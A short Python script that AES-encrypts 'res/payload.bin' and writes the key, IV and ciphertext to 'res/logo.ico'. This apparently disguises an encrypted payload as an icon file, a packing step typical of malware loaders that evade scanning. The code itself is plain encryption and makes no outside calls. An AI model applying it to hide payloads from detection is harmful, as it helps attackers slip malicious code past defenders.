from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def encrypt_file_with_key_iv(input_file, output_file):
    # Generate a random AES key and IV
    key = get_random_bytes(32)  # 256-bit key
    iv = get_random_bytes(16)   # 128-bit IV
    print(f"[+] IV => {iv.hex()}\n[+] Key => {key.hex()}")

    # Initialize AES cipher in CBC mode
    cipher = AES.new(key, AES.MODE_CBC, iv)

    # Read the input binary file
    with open(input_file, 'rb') as f:
        plaintext = f.read()

    # Pad the plaintext to a multiple of 16 bytes
    padding_len = 16 - (len(plaintext) % 16)
    padded_plaintext = plaintext + bytes([padding_len] * padding_len)

    # Encrypt the padded plaintext
    ciphertext = cipher.encrypt(padded_plaintext)

    # Write the key, IV, and ciphertext to the output binary file
    with open(output_file, 'wb') as f:
        f.write(key + iv + ciphertext)

    print(f"Encryption complete. Key and IV prepended to {output_file}")

# Usage
input_file = "res/payload.bin"  # Replace with your input file path
output_file = "res/logo.ico"  # Replace with your output file path
encrypt_file_with_key_iv(input_file, output_file)
